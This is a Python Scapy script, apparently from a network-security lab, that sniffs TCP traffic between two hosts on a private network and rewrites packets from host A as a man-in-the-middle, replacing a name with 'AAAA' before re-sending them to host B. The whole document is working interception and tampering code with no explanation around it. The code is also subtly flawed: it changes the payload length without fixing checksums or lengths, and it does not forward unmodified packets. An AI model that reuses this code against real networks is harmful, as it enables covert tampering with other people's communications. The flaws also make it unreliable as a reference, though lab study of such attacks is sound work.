#!/usr/bin/env python3
from scapy.all import *

IP_A = "10.9.0.5"
MAC_A = "02:42:0a:09:00:05"

IP_B = "10.9.0.6"
MAC_B = "02:42:0a:09:00:06"

IP_M = "10.9.0.105"
MAC_M = "02:42:0a:09:00:69"

FIRST_NAME = "amrutha"  

def spoof_pkt(pkt):
    if IP in pkt and TCP in pkt:
        if pkt[IP].src == IP_A and pkt[IP].dst == IP_B:
            # Replace occurrences of your first name with a sequence of 'A's
            payload = pkt[TCP].payload.load.decode(errors='ignore')
            modified_payload = payload.replace(FIRST_NAME, 'AAAA')

            # Create a new packet with the modified payload
            newpkt = IP(bytes(pkt[IP])) / TCP(bytes(pkt[TCP]))
            newpkt[TCP].payload = bytes(modified_payload, 'utf-8')

            # Forward the modified packet to Host B
            send(newpkt)

# Sniff the network and intercept packets
f = 'tcp and (ether src ' + MAC_A + ' or ether src ' + MAC_B + ')'
pkt = sniff(iface='eth0', filter=f, prn=spoof_pkt)
